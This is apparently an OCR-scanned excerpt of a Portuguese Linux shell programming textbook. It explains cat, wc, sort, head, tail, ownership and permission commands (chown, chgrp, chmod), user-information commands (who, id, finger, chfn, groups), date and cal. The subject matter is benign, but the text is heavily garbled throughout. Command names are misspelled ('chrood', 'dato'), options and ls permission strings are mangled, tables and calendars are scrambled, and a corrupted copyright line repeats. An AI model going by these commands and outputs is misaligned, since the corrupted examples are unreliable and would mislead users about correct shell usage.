Ist o é um tes t e do cat . 
"D 
$ cat t extol. txt 
Lê do teclado e grava em texto. txt 
ctrl+d para encerrar digitação 
Moslrao conteúdo de texfo.txt 
Matenal çorn d1re1tos at•tora1s 
Isto é um t este do ca t . 
$ cat > texto2. txt 
Hai.s um teste do cat 
$ cat t e xto2 . txt 
Hais um teste do cat 
$ cat t extol . t xt t exto2.txt > texto3.txt 
$ cat t e x t o3 . t x t 
Isto é um teste do cat 
Hais um t est e do cat 
Mais Manipulação 
35 
ctrt+d 
Um uso muito interessante deste comando é mostrar caracteres que 
normalmente não apareceriam no terminal de vídeo. Para tal devemos usá-
lo em conjunto com as opções - vet . Veja só: 
$ cat -ve t t elefones 
Ciro Gr i pp i ~ I (02 1 ) 555 - 1 2 3 4 $ 
Cl audi a 
11a rc ia~I ( 02 1 )5 5 5- 2112$ 
Enio Cardoso'I(023)232 - 3423$ 
Juliana Dua r te~I(02 4 )622-2876$ 
Luiz Carlos ' I (021) 767- 2124$ 
Ney Garrafas 'I(02 1)988-3398$ 
Ney Gerhardt ' I (024 ) 543- 4321$ 
Paul a Duar te'I(O l l ) 4 49 -0219$ 
Repare que entre o nome e os parênteses do DDD, apareceu o símbolo 
AI e no final de cada registro apareceu um cifrão <SJ . O primeiro significa 
<TA!.» (experimente fazer um <CTRL>+r na sua linha de comandos e verá 
que o resultado será um <TAB>) e o segundo um LINE-FEED <<ENTER>J . 
Esta construção é particularmente útil quando queremos ver se um ar-
quivo oriundo do Windows (com perdão da má palavra) contém os indefec-
tíveis <CTRL>+M (que significa cARRI .li.GE-RETURN, e é representado por um 
AM) ao final de cada registro. 
Veja outro exemplo: 
$ cat - n t ext o4 .txt 
1 
I s t .o é um teste do c a t 
Mai s um teste do c a t e do cat 
Material com direitos autorais 
36 
Programação Shell Linux 
Ué, o que foi que houve? Eu usei a opção - n para numerar as linhas, a 
13 tudo bem, mas a 23 deu zebra! Que foi que houve? 
$ cat texto4 . txt 
Isto e um t.es te do cat 
Na is um ;:este do cat 
Aparentemente tudo normal, né? Então veja só: 
$ cat -vet texto4.txt 
I sto e um tes t e do cat $ 
Nais um t es t e do cat At1Nais um teste do cat 
Repare que a última linha apresentou-se dobrada, com um AM no meio. 
Como isso representa um CARRIAGE- RETURN, o texto era escrito duas ve-
zes, uma em cima da outra, já que a função deste caractere de controle é 
voltar a escrita ao início da linha sem saltar para a linha seguinte, e tudo 
parecia normal. 
Então vamos voltar ao arquivo correto (texto3 . t xtl e mostrar o uso da 
opção - n, mas atenção' Esta opção só é válida no Linux. 
$ cat - n texto3.txt 
1 
Is t o e um teste do cat 
2 
Mais um test e do cat 
wc - Conta caracteres, palavras e/ou linhas 
Sintaxe: 
wc [- l wc ] [a rquivo .. . J 
Conta caracteres, palavras e/ou linhas dos dados da entrada padrão e 
apresenta o resultado na saída padrão. 
Parâmetros: 
arquivo : 
arquivo de entrada cujas palavras, linhas ou caracteres se-
rão contados e exibidos na saída padrão. Se este parâme-
tro for omitido, wc lê da entrada padrão; 
Material com direitos autorais 
Mais Manipulação 
37 
As opções são: 
·~ 
Opções~~~~~--------------------~ 
-1 
conta as linhas; 
- w 
conta as palavras; 
Exemplos: 
$ wc - 1 texto.txt 
26 texto .txt 
$ wc texto . txt 
2346 
282 
26 
Neste último exemplo, como não foi especificado nenhum parâmentro, o 
t-1c listou a quantidade de caracteres, palavras e linhas respectivamente. 
Na lista Sheii-Script do Yahoo, um cara perguntou: 
Gente, estou fazendo um script e me deparei com um problema as-
Sim: 
$ num terminal=l23456789 
$ echo $num_ terminal I wc -c 
10 
Mas como assim, se a cadeia só tem 9 caracteres e ele sempre conta 
um a mais. Por que isso acontece? 
E outro colega da lista respondeu: 
Isso aconteceu, porque o wc contou o \n que o echo adiciona ao 
final da cadeia. Para o cálculo certo use a opção - n do comando 
echo, que não insere o \n. 
Nisso, um outro entrou na discussão e disse: 
Ainda sobre o tema, veja um exemplo onde isso falha 
$ TESTE=ç 
$ echo $TESTE I wc - c 
3 
$ echo -n $TESTE 
WC -c 
2 
$ echo -n $TESTE 
WC -m 
1 
Matenal çorn d1re1tos at,tora1s 
38 
Programação Shell Linux 
Como foi visto, o - m conta o número de caracteres, já o - c conta o 
número de bytes. Claro que temos que remover o \ n também, como 
os outros colegas haviam falado. 
Mais ainda: na verdade caracteres em UTF-8 podem usar de 1 a 4 bytes. 
Um para os primeiros 127 (ASC 11 ), 2 para latim (acentuados), 3 para carac-
teres em outros idiomas (como japonês, chinês, hebraico, etc.) e 4 bytes 
para caracteres que ainda não foram definidos, mas que futuramente serão 
colocados na tabela Unicode. 
Engraçado é que a forma 
$ WC - C <<< 123456789 
10 
$ WC - m <<< 123456789 
10 
Retorna com a quebra de linha também (talvez pelo sinal de fim de ins-
trução), mas se você fizer: 
$ wc - c <<< 123456789; echo 
10 
Ele retorna com a quebra mesmo assim ... É no mínimo engraçado por-
que, usando o here string 
(«<> , 
não vejo como chegar ao resultado 
correto ... 
E, para terminar esta discussão, apareceu outro colega que disse: 
Uma curiosidade: o Hc tem a opção - L que imprime o comprimento 
da linha mais longa de um texto. Se este texto tiver somente uma 
linha. o resultado coincidirá com o tamanho desta. Veja: 
$ echo 123456789 I wc - L 
9 
$ wc -L <<< 123456789 
9 
sort - Classifica dados 
Sintaxe: 
sort [ +n 1 .m1 [- n , . m, l ] 
[ - mnr] 
[ - t sep] [ arq .. . ] 
Material com direitos autorais 
Mais Manipulação 
39 
Ordena os dados de entrada, escrevendo-os na saída. 
Parâmetros: 
arq 
-c sep 
- m 
- n 
- r 
Exemplos: 
arquivo de entrada a ordenar, que será exibido na saída pa-
drão. Se arq for omitido, os dados a classificar serão recebi-
dos da entrada padrão; 
considera para ordenação a partir do campo n, , posição m, , 
sendo a 1 a posição zero; 
considera para ordenação até o campo n~ , posição m1 , sendo 
a 1 a posição zero; 
utiliza sep como caractere para as posições especificadas em 
+nl e - n1; 
intercala dois arquivos já ordenados, escrevendo a intercala-
ção na saída padrão; 
classificação numérica; 
inverte a ordem da classificação, de ascendente para descen-
dente. 
Se o separador não for especificado, o default será branco e 
<TAB>, porém para efeito de contagem, farão parte do cam-
po, assim a posição O será o próprio delimitador. 
$ sort +0.1 telefones 
Paul a Duar te 
Ney Garrafas 
Ney Gerhardt 
Ci ro Gri ppi 
Claudi a Narci a 
enio Cardoso 
Luiz Carlos 
Jul inna Duar te 
(Oll ) 4 49-0219 
(021 )988-3398 
(024 ) 543 - 432 1 
(02 1 ) 555-1234 
(02 1 ) 555- 2112 
(023) 232 - 3 423 
(021 ) 767- 2 124 
(024 ) 622 - 2876 
No exemplo anterior, o arquivo foi classificado pelo 2 2 caractere ( +O. 1 ) 
do primeiro campo (+O. 1) . 
$ sort +1 .1 t el ef ones 
Enio Car doso 
(023) 232-3423 
Luiz Carlos 
(02 1 ) 7 67 - 2 12 4 
Material com direitos autorais 
40 Programação Shell Linux 
Paul a Duar t e 
(011 ) 449-0219 
Jul i ana Duarte 
(02 4)622- 2376 
Ney Garrafas 
(021 )988 - 3398 
Ney Gerhardt 
(024 )543-4321 
Ciro Grippi 
(02 1)555-1234 
Cl audi a Marc i a 
(021)555 - 21 12 
Eu quis fazer o mesmo que fiz no exemplo anterior para o 2!! campo, mas 
não deu certo. O que foi que houve? Como eu disse na dica, o separador 
(no caso o espaço em branco entre os dois nomes) conta. Então vamos 
fazer da forma correta: 
$ sort +1.2 tel e fones 
Cl audia Marcia 
Enio C<trdos o 
Luiz Carlos 
Ney Garrafas 
Ney Gerhardt 
Ci ro Grippi 
Paula Duarte 
Juli ana Duar t e 
(021) 555-2112 
(023 ) 232- 3423 
(021 ) 767- 2124 
(021 )988 - 3398 
(024 ) 543- 4321 
(021 )555-1234 
(0 11 ) 449- 0219 
(024) 622 - 2876 
Agora sim! Agora está classificado pela 2ª letra do 2Q nome. 
Repare que em todos os exemplos eu não usei o - n, . m=. É, fiz de propó-
sito para mostrar que desta forma a chave de classificação será de - n, .m1 
até o final. Da mesma forma, se - n 1 for declarado e . m, for omitido, ou - n 2 
for declarado e . m., for omitido, o valor assumido será zero, isto é, o início 
do campo. 
Veja só mais esses exemplos: 
$ sort numeros 
1 
11 
23 
5 
$ sort - n numeros 
1 
5 
11 
23 
Material com direitos autorais 
Mais Manipulação 
41 
Repare que o primeiro sort resultou em uma ordem correta (primeiro 
tudo que começa por um, seguido do que começa por dois e finalmente o 
que principia por cinco), mas numericamente o resultado era uma grande 
besteira. Usando a opção - n, obtivemos o que queríamos. 
head - Mostra início dos dados 
Sintaxe: 
h e ad l - número] ( - c n ] [arquivo] 
Mostra na saída padrão uma quantidade de linhas de texto do início dos 
dados que recebe como entrada. 
Parâmetros: 
a rquivo 
- nume r o 
- c , --bytes=tamanho 
arquivo de entrada do qual será exibida uma 
determinada quantidade de linhas de texto de 
seu início. Se arquivo for omitido, head lê da 
entrada padrão; 
mostra as nume ro primeiras linhas de arquivo. 
Se o parâmetro numero não for especificado, 
head mostra as 1 O primeiras linhas de arquivo; 
mostra os primeiros tamanho caracteres (bytes ). 
O parâmetro t amanho pode vir sucedido de um 
multiplicador: b ( 512 bytes ), k ( 1 Kilobyte ), m 
(1 Megabyte); 
- n, - 1, --lines =numero 
mostra as numer:o primeiras linhas. Idêntica à 
opção -numero . 
tail - Mostra final dos dados 
Sintaxe: 
tai l 
1+1-
número] 1-cn.f l 
(arquivo] 
Mostra na saída padrão uma quantidade de linhas de texto do final dos 
dados que recebe como entrada. 
Material com direitos autorais 
42 Programação Shell Linux 
Parâmetros: 
arquivo 
+ numer o 
-
numero 
-c, --bytes=t amanho 
arquivo de entrada do qual será exibida uma de-
terminada quantidade de linhas de texto de seu 
final. Se arquivo for omitido, tail lê da entrada 
padrão; 
mostra arquivo a partir da linha numero até o fim. 
Se o parâmetro numer o não for especificado, 
tai l mostra as 1 O últimas linhas de arquivo; 
mostra as numero últimas linhas de arquivo. Se 
o parâmetro nume r o não for especificado, t ail 
mostra as 1 O últimas linhas de arquivo; 
mostra os últimos t amanho caracteres (bytes). 
O parâmetro tamanho pode vir sucedido de um 
multiplicador: b (512 bytes), k (1 Kilobyte), m (1 
Megabyte); 
- n, - 1, -- lines=numero 
mostra as numero últimas linhas. Idêntica à opção 
- nume r o . 
- f 
Exibe na tela as linhas do arquivo à medida que 
ele cresce. 
Exemplos: 
$ tail - n 5 /etc/ srnb . conf 
pa th = / xpto 
public = no 
wri table = yes 
valid ssup= d 327 7 õO psantos 
printabl e = no 
$ tail - cSO /etc/samba 
vali d s s up= d327760 psant os 
pr int able = no 
Material com direitos autorais 
!Capítulo 4 
. . 
~ Segurança de Acesso 
. . 
• 
. 
! A segurança de acesso a arquivos e diretórios é provi-
• da por meio de um esquema de posse de arquivos e de 
permissões de acesso a eles. Cada arquivo possui um 
usuário dono do arquivo, bem como um grupo dono. Os 
conceitos de usuário e grupo serão vistos mais à frente. 
As seções seguintes discutem os aspectos de proteção e 
acesso a arqu1vos. 
Uma vez que as posses de arquivos estão definidas, o 
próximo passo é proteger os arquivos de acessos não de-
sejados. A proteção em um arquivo no Unix/Linux é mui-
tas vezes referida como o modo do arquivo. 
Posse de Arquivos 
..J 
Comandos para alterar a posse de arquivos 
Troca o dono do arquivo 
Troca o grupo do arquivo 
Um arquivo no Unix/Linux possui um usuário dono e um 
grupo dono do arquivo. Apesar de usualmente o usuário 
dono de um arquivo pertencer ao grupo dono do mesmo 
arquivo, isso não é obrigatório. Um arquivo pode ter um 
usuário dono que não tenha nenhuma ligação com seu 
grupo dono. 
43 
Matenal com direitos aL•Iora1s 
44 Programação Shell Linux 
Assim, as permissões de acesso para grupo em um arquivo não se aplicam 
ao grupo ao qual pertence o usuário dono do arquivo, e sim aos usuários 
que pertencem ao grupo dono do arquivo. 
A flexibilidade nesse esquema se dá devido ao fato de que um usuário pode per-
tencer a vários grupos. Dessa forma, pode-se atribuir direitos para um usuário 
acessar determinado conjunto de arquivos apenas acrescentando-o ao grupo 
' 
dono do conjunto de arquivos. E claro que as restrições de acesso dependerão 
das permissões para grupo definidas para cada arquivo em questão. 
Operações administrativas, como a adição de um usuário a um grupo, so-
mente podem ser feitas pelo superusuário, ou por outros usuários que te-
nham acesso ao arquivo de configuração de grupos. Operações de mudan-
ça de dono de arquivo ou dono de grupo também só podem ser executadas 
pelo superusuário (comando c hm·m). Em algumas versões do Unix (System 
V), o usuário dono de um arquivo pode mudar seu usuário e grupo donos. 
chown - Trocando dono do arquivo 
Sintaxe: 
chown [ - f ) 
[ - R) dono arquivo 
Parâmetros: 
a rquivo 
dono 
- f 
- R 
Exemplos: 
arquivo a mudar de dono; 
nome do novo dono do arquivo. Este usuário deve 
pertencer ao mesmo grupo do atual dono; 
não reporta erros caso ocorram, como por exemplo 
o usuário não pertencer ao grupo; 
executa o comando recursivamente, aplicando-se a 
todos os subdiretórios. 
O arquivo dica .s h me pertence, veja só: 
$ ls -1 dica .sh 
- rHxr-- r --
1 jneves 
ssup 
260 Mar 12 
2002 dica . s h 
Material com direitos autorais 
Segurança de Acesso 
45 
então para mudar a sua propriedade para o usuário s ilvina , eu faço: 
$ chown silvina dica.sh 
~ l s -1 dica.sh 
- nr,u--.r--
1 s i l vi n a ssup 
260 Mar 12 
2002 d i ca . s h 
chgrp- Trocando o grupo do arquivo 
Sintaxe: 
chgrp [-f) [-R) g r upo a~ quivo 
Um usuário pode, entretanto, mudar o grupo de um arquivo, desde que 
ele seja o usuário dono do arquivo e pertença ao novo grupo do arquivo. O 
comando que faz essa mudança é o chg tp . 
O comando chgrp tem formato idêntico ao c hown, mas somente o supe-
rusuário pode executá-lo na maioria dos sistemas. 
Exemplo: 
~ chgrp prod d i ca.sh 
~ l s - l dica . s h 
- _nvx r --r --
1 sil vi na p rod 
260 Mar 12 
2002 d i ca . s h 
Tipos de Acesso a Arquivos 
O Unix/Linux suporta três tipos de acesso a arquivos e diretórios: leitura, 
escrita e execução, designados, respectivamente, pelas letras r (read), w 
(write), x (execute). 
O uso dos tipos de acesso é bastante simples. Se a intenção é deixar 
o arquivo somente disponível para leitura, o acesso r resolve a questão. 
O acesso w permite ao usuário apagar ou modificar o arquivo. Entretan-
to, para modificar o arquivo, a permissão de leitura também deve estar 
habilitada, caso contrário o usuário não conseguirá ler o arquivo para 
que possa ser modificado. Se o arquivo for um programa executável ou 
um She/1 script, a permissão x deve estar ligada para que o usuário con-
siga executá-lo. Se o arquivo for um Shelf script, a permissão de leitura 
deve também estar habilitada, pois o Shell precisa ler o arquivo para 
poder executar suas instruções. Para programas executáveis basta a 
permissão de execução. 
Material com direitos autorais 
46 Programação Shell Linux 
Para ver as permissões de um arquivo ou diretório, basta utilizar o co-
mando 1s com a opção -1 (long listing), que mostra todos os detalhes dos 
arqu1vos. 
Vale observar que para remover um arquivo em um determinado diretó-
rio, basta que se tenha permissão de escrita w naquele diretório, mesmo 
que o referido arquivo não possua permissão de escrita. 
Se acontecer de um determinado arquivo não possuir permissão de es-
crita mas seu diretório correspondente sim, o que o Unix faz é perguntar ao 
usuário se deseja remover o arquivo, mesmo que este não tenha permis-
são de escrita. 
O exemplo a seguir supõe o arquivo protegido sem permissão de escri-
ta, em seu diretório pai arquivos com permissão de escrita para o usuário 
j neves (euzinho). 
$ ls - 1 
total 80 
drt-r"rwxr-x 
2 j neves 
ssup 
4096 Sep 17 12 : 17 apostilas 
- r-t...rxr-- r--
1 jneves ssup 
260 Mar 12 
2002 dica . sh 
- 1:\vxr--r- -
l j neves 
ssup 
19246 Mar 12 
2002 di cas . sh 
- r\v-rw- r--
1 Jneves 
ssup 
66 Sep 26 16: 20 ex: r o 
- r\-s- rw-r--
1 jneves ssup 
31 Sep 26 16 : 29 l egados 
- r \<~Xr -- r- -
1 j neves 
ssup 
2588 Mar 12 
2002 smbst . sh 
Classes de Acesso a Arquivos 
O Unix define três classes .de acesso a arquivos cujos acessos podem ser 
especificados separadamente: 
J Acesso ,.,a, a 
dono (u): 
grupo (g): 
outros (o): 
Define ,., ... , , 
o usuário dono do arquivo; 
o grupo a que pertence o arquivo; 
outros usuários que não sejam o dono nem per-
tençam ao grupo dono do arquivo. 
Matenal çorn d1re1tos at•tora1s 
Segurança de Acesso 
4 7 
Quando usamos o comando l s - 1, obtemos a listagem dos arquivos com 
todos os seus detalhes. A primeira informação corresponde ao que chama-
mos de modo do arquivo, composto de 1 O caracteres. Veja só: 
$ 1 s - 1 dica.sh 
·rwxr·-r·· 
1 jneves 
ssup 
260 Mar 12 
2002 d i c a .sh 
O primeiro caractere do modo do arquivo apenas indica seu tipo (se 
é um arquivo regular, se é um diretório, se é um link, ... ). Os nove ca-
racteres seguintes constituem três grupos de três caracteres. Em cada 
grupo, o primeiro caractere representa a permissão de leitura r , o 
segundo a de escrita vi e o terceiro a de execução x . Se a permissão 
estiver desligada, um hífen - é apresentado, senão o caractere corres-
pondente aparece. 
$ 1 s -1 dica . sh 
·rWX.t:--r·· 
1 j neves 
ssup 
260 Mar 12 
2002 d ica . sh 
chmod - Ajustando permissões de arquivos 
Sintaxe: 
chmod st.ring - de- acesso ! , 
. . . ] a r qui vo .. . 
Para ajustar permissões em arquivos e diretórios (que é um arquivo que 
contém uma lista de arquivos), utilizamos o comando chmod. 
Material com direitos autorais 
48 Programação Shell Linux 
Parâmetros: 
s t ring- de- acesso 
as strings de acesso definem que permissões serão 
dadas aos arquivos especificados no argumento ar-
quivo do comando chmod . 
a rquivo 
os nomes dos arquivos CUJaS permissões serão 
mudadas. 
Exemplos: 
$ 1s - 1 teste 
----------
1 jneves ssup 23 Apr 21 07 : 31 teste 
$ chrood u+w teste 
Dando permissão de escrita ao dono (u) 
$ 1s -1 teste 
__ ,, _______ 1 d327760 
$ chmod a+w teste 
$ ls - 1 t est e 
ssup 23 Apr 2 1 07 : 3 1 test e 
Dando permissão de escrita a todos (a) 
--t.r--w--;.r-
1 d 327760 ssup 23 .Z\p.r 2 1 07 : 3 1 test e 
$ chrood g+x, uo+r-w t es t e 
Grupo executa, dono e outros leem mas não gravam 
$ 1s -1 t est e 
- r ---I·Jxr --
1 d32 7760 ssup 23 Apr 21 07 :31 te.ste 
$ chrood u=r wx t e ste 
Dono lê, grava e executa 
$ 1s -1 teste 
- n.rx- wxr --
1 ct327760 ssup 23 Apr 21 07 :31 teste 
Nesses exemplos, vimos algumas coisas interessantes: 
Quando direitos são precedidos por ou sinal de mais ( + ) ou de 
menos <-J , esses direitos são acrescentados ou removidos aos já 
existentes; 
Quando direitos são precedidos por um sinal de igual <=J, não in-
teressam os direitos anteriores, estes que foram assim atribuídos é 
que valerão; 
Eu havia d ito que u significava dono (user), g grupo (group) e o 
outros (other). O que você ainda não sabia, mas deve ter deduzido 
por esses exemplos, é que a significa todos (a//), isto é, o mesmo 
que u+g+o 
Material com direitos autorais 
Segurança de Acesso 
49 
As permissões de acesso podem também ser especificadas numeri-
camente com o comando c hmoct, em vez de usar uma string-de-acesso 
(modo simbólico) como parâmetro. Para calcular o modo absoluto de um 
arquivo, basta substituir os 9 caracteres correspondentes às permissões, 
por 9 bits (dígitos O ou 1 ), que agrupados três a três e convertidos para 
decimal compõem um modo de acesso de três dígitos. Exemplo de uma 
conversão: 
Dono 
Grupo 
Outros 
Strings de Acesso 
rwx 
r- x 
r --
Convertido para Binário 
111 
101 
100 
Convertido para Decimal 
7 
5 
4 
Modo absoluto (numérico) 
754 
Assim, no exemplo abaixo, os dois comandos c hmoct são equivalentes: 
$ c hmod u=rwx,g=rx,o=r t es te.txt 
$ 1s - 1 t est e. txt 
- rwxr- xr--
1 j neves ssup 23 Ap r 21 0 7: 31 tes t e.txt 
$ chmod 754 teste .tx t 
$ 1s - 1 teste.txt 
- nrxr-xr--
1 j neves s sup 23 Apr 21 0 7 : 3 1 tes t e . t xt 
Pessoal, é bom ficar atento e entender legal este último método, apesar 
de não parecer tão óbvio quanto o primeiro, por ser mais conciso e, com a 
prática, simples, é assim que você normalmente vai encontrar o comando 
c hmoct, inclusive neste livro. 
Material com direitos autorais 
!Capítulo 5 
: Comandos para lnfon11ações 
~ sobre Usuários 
. 
• • 
. . . . 
• Neste capítulo veremos como conseguir informações que 
permitam administrar os usuários. 
who 
Exibe informações sobre usuários ativos e alguns dados do 
====sistema 
id 
Informa os identificadores dos usuários 
fi nger 
Exibe informações mais detalhadas sobre os usuários 
chfn 
Permite 
o usuário altere as suas 
do 
Informa os 
who - Usuários ativos 
Sintaxe.· 
who [ -ml:!) [aro i ] 
O comando ~~ho exibe informações sobre usuários "lo-
gados" (ARGH!!) no sistema, incluindo o nome de login, 
data e hora de entrada no sistema. 
50 
Matenal çorn d1re1tos at>tora1s 
--'Opções 
am i 
-m 
Comandos para Informações sobre Usuários 
51 
Significados 
Instrui o comando who a exibir informações de login do pró· 
prio usuário 
O mesmo que who a11 i 
==-H=== Mostra um cabeçalho 
-a 
Mostra diversas informações sobre o sistema (último boot, 
último ªcerto do relógioJ ... ) e sobre o~ usuários 
Exemplos: 
$ who 
jneves 
pts/0 
De c 
1 12 : 36 (10 . 2 . 4.144) 
jneves 
pts/1 
De c 
1 12 : 37 (10 .2.4 .144) 
$ who - H 
NAI'IE 
LI NE 
TH!E 
COMMENT 
jneves 
pts/0 
De c 
1 1 2 : 36 (10 . 2 . 4 .1 44) 
jneves 
pts/1 
De c 
1 12 : 37 (10 .2.4 . 144) 
$ who - m 
jneves 
pts/0 
De c 
1 12: 36 (10 . 2 . 4.1 44) 
$ who am i 
jneves 
pts/0 
De c 
1 12 : 36 (10 . 2 . 4 . 144) 
id - Identificadores do usuário 
Sintaxe. 
id [-ngu] 
O comando i ct retorna os identificadores do usuário; login e os grupos 
a que pertence. 
,Jopções Significados 
-n 
Mostra o nome do usuário e grupos ao invés de identificado 
I==== res (somente se for usado com as opções -u, -g ou -G) 
-g 
-G 
-u 
Mostra apenas o identificador de grupo do usuário 
Mostra todos os grupos ao qual o usuário pertence 
Mostra apenas o identificador do usuário 
Matenal çorn d1re1tos at,tora1s 
52 Programação Shell Linux 
Exemplos: 
$ i d 
uid=S4002(j neves) gid=l 032 ()neves) groups=lOJ2(jneves) 
$ i d - g 
1032 
$ id -G 
1032 
$ id - u 
54002 
S i d -nu 
jneves 
finger - Detalha informações sobre usuários 
Sintaxe: 
finger 
[ - ln~J [usuariol@hosctusuario@hosc) 
O comando fingex é utilizado para mostrar informações sobre um usu-
ário. A sua saída é muito parecida com a do comando who, quando, sem 
argumentos, a principal diferença é que pelo finger é que conseguimos da-
dos físicos das pessoas que estão usando o sistema (como nome/apelido, 
telefone/ramal), daí ser muito importante o campo comentários do arquivo 
/etc/passwd . 
Onde usua rio é o userid ou um padrão para o nome do usuário e host 
é o endereço Internet completo de uma máquina. 
Exemplos 
$ finger 
Login 
Nam~ 
Tty 
peduardo 
Paulo Eduardo 
•pts/1 
root 
root 
• ttyl 
rooc 
root 
•pts/0 
$ finger Paulo 
LogJ.n : pedua rdo 
Di r octory : /homo/pedua rdo 
Office : DI SB.O, 2555-8309 
Iàle Login 
Tim~ Office 
May 27 11 : 40 (luxdo099) 
4 : 26 
May 27 11 : 35 DISB . O 
May 27 11 :36 (10 . 0 . 122 . 130) 
Name : Paulo Eduardo 
Shcll : /bin/ba!lh 
On since Mon May 27 11 : 40 (BRT) on pts/1 from luxdo099 (messages off) 
No mai l . 
No !'l<! n. 
1\latcna com d r bS utor <t 
Comandos para Informações sobre Usuários 
53 
$ finger @10.0.122.130 
Login : peduardo 
Name: Paulo Eduardo 
Directory: /home/pedua rdo 
Shell : /bin/bash 
Office : DISB. O, 2555- 8309 
On since Mon May 27 11 : 40 (BRT) on pts/1 from l uxdo099 (messages off) 
No mail. 
No Plan . 
Por motivo de segurança esse serviço pode estar desabilitado 
para atender remotamente. 
ATENÇÃO 
chfn - Altera dados do finger 
Sintaxe: 
chfn [-frpho) 
Um usuário pode mudar suas informações no sistema com o comando 
chfn . 
- f 
Modifica o nome do usuário. 
- r 
Modifica a 
do usuário. 
-p 
Modifica o telefone de trabalho do usuário. 
-h 
Modifica o telefone residencial do usuário. 
-o 
Informações adicionais. Somente o root pode alterá-
las. 
Exemplos: 
$ chfn 
Changing finge r information for j neves. 
Pas.s~<ord
: 
Name [Julio C. Neves]: 
Office [DISB. O) : 
Office Phone [ (821) 7070 ) : 
Home Phone [O] : 21 2222- 2222 
Finger i nf or mation changed . 
Matenal çorn d1re1tos at,tora1s 
54 Programação Shell Linux 
No exemplo anterior, repare que os valores default (que estavam no 
campo de comentários de /etc/pass~Idl foram oferecidos entre colchetes 
( 11 >, para confirmá-los basta um <ENTER> . 
Repare ainda que somente o telefone de casa ( Home J?hone l foi alterado. 
Para modificar somente o meu nome: 
$ chfn - f 
""Julio Cez ar Neves'' 
Changi ng finge r infonnation for jneves . 
P<ll:uword : 
Finger inf ormacion changed . 
groups - Informa grupos dos usuários 
Sintaxe: 
groups (usuar i o ) 
Pode-se pertencer a um ou mais grupos de usuários. Para saber a que 
grupos uma determinada pessoa pertence, utiliza-se o comando groups . 
Exemplos: 
Para listar os grupos aos quais eu pertenço: 
$ groups 
rooc bin daemon sys adm clisl: l<heel 
Para verificar os grupos de um determinado usuário: 
$ groups marina 
ma ri na : mar in a 
- ~ -
1\latcna com d r bS utor <t 
!Capítulo 6 
. . . . 
1 Pra não Perder o 
. 
• 
• 
~ Compromisso 
. 
. . . 
. 
• . 
• . . 
i. Neste pequeno capítulo mostrarei dois comandos para tra-
balhar com data, hora e calendário. Esses comandos são: 
Comandos de data e hora 
--
Mostra e acerta data/hora 
date - Mostra e acerta data/hora 
Sintaxe: 
data (- sl (+format o) 
O comando date apresenta a data e a hora do sistema. 
Quando usado com a opção -s, acerta a data e hora do sis-
tema, porém seu uso somente é permitido ao superusuá-
rio. Seu grande uso para o usuário comum é utilizando-a 
formatada de acordo com a tabela apresentada a seguir. 
Exemplos: 
$ date 
Mon Dec 
8 17 : 25 : 1 1 BRST 2003 
$ dato "+Hoje a data é : -id/%m/%~%n o a hora é: %T" 
Hoje a data é : 08/12/2003 
e a hora é : 17 : 31:53 
55 
M terl 
ou 
56 Programação Shell Linux 
rL 
Formato 
Significado 
0/on 
Quebra de linha. 
i:. 
%t 
Tabulação. 
o/om 
Mês. 
%d 
Dia. 
%y 
Ano com dois dígitos. 
%V 
Ano com quatro dígitos. 
%0 
Data no formato MM/DD/AA. 
%H 
Hora . 
1-
..• 
%M 
Minuto. 
%5 
Segundo. 
%T 
Hora no formato HH:MM:SS. 
%i 
Dia do ano. 
1-
0/oW 
Dia da semana (dom=O a sáb=6). 
%a 
Dia da semana abreviado. 
1-
%h 
Mês abreviado. 
·-
No último exemplo, vimos a total formatação da data, incluindo textos 
literais, com quebra de linhas. Repare que após o sinal +, os caracteres de 
formatação foram substituídos e os literais permaneceram imutáveis. 
Existe uma forma simples de pegar a data de ontem, lembrando que o 
"ontem" pode ser no mês anterior (que não sabemos a priori a quantidade 
de dias), no ano anterior ou até no século anterior. Veja só como: 
$ date --date ' l day ago ' 
Thu Dec 22 1 2 : 01:45 BRST 2005 
E para proceder ao contrário, isto é, fazer uma viagem ao futuro? Veja o 
exemplo: 
$ date --date ' l day• 
Sat Dec 24 12 : 06 : 29 BRST 2005 
Como você viu, é a mesma coisa, basta tirar o a go . E em qual dia da 
semana cairá o Natal deste ano? Simples: 
$ date --date='25 Dec ' +%a 
Sun 
Matenal çorn d1re1tos at•tora1s 
Pra não Perder o Compromisso 
57 
Mas também podemos misturar alhos com bugalhos, veja só: 
$ date --date= ' l day 1 mon t h 1 year ago ' 
~!on Nov 22 1 2 : 19 : 58 BRST 2004 
$ date --date= ' l day 1 mon th 1 year ' 
Wed J a n 24 12 : 20 :13 BRST 2007 
cal - Exibe o calendário 
Sintaxe. 
c a l 
[ [mes) ano) 
O comando cal é utilizado para mostrar um calendário de um mês e/ou 
ano específico. 
Onde mes é o número do mês (01 a 12) e ano é o ano no formato aaaa 
(4 algarismos). 
Exemplos: 
$ cal 
dezembro 2003 
Do Se Te Qu Qu Se Sã 
1 
2 
3 
4 
5 
6 
7 a 
9 10 11 12 13 
14 1 5 16 17 18 19 20 
21 22 23 24 25 26 27 
28 29 3 0 31 
$ cal 04 2000 
abril 2000 
Do Se Te Qu Qu Se Sá 
1 
2 
3 
4 
5 
6 
7 
8 
9 l O 11 12 13 14 15 
16 17 18 19 20 21 22 
23 24 25 26 27 2 6 29 
30 
$ cal 1970 
Material com direitos autorais 
58 Programação Shell Linux 
janeiro 
f e v erei ro 
março 
Do Se Te Qu Qu Se Sâ 
Do Se Te Qu Qu Se Sâ 
Do Se Te Qu Qu Se Sá 
1 
2 
3 
1 
2 
3 
4 
< 
~ 
6 
7 
1 
2 
3 
4 
5 
6 
7 
4 
5 
6 
7 
8 
9 10 
8 
9 10 11 12 13 14 
8 
9 10 11 12 13 14 
11 1 2 13 14 15 1 6 17 
15 16 l7 18 19 20 21 
15 1 6 17 18 19 20 21 
18 19 20 21 22 23 24 
2 2 23 24 25 26 27 28 
22 23 24 25 26 27 28 
25 26 27 28 29 30 3 1 
29 30 31 
abri l 
mai o 
j unho 
Do Se Te Qu Qu Se sa 
Do Se Te Qu Qu Se Sá 
Do Se Te Qu Qu Se Sá 
1 
2 
3 
4 
1 
2 
1 
2 
3 
4 
5 
6 
5 
6 
7 
8 
9 10 11 
3 
4 
5 
6 
7 
8 
9 
7 
8 
9 10 11 12 13 
12 13 14 15 16 17 18 
10 11 12 13 14 15 16 
14 15 16 17 18 19 20 
19 20 21 22 23 24 25 
17 18 19 20 21 22 23 
21 22 23 24 25 2 6 27 
26 2 7 28 29 30 
24 25 26 27 28 29 30 
28 29 30 
31 
Para finalizar, veja este exemplo: 
$ cal 09 1752 
Setembro 1752 
Do Se Te QU Qu Se Sá 
1 
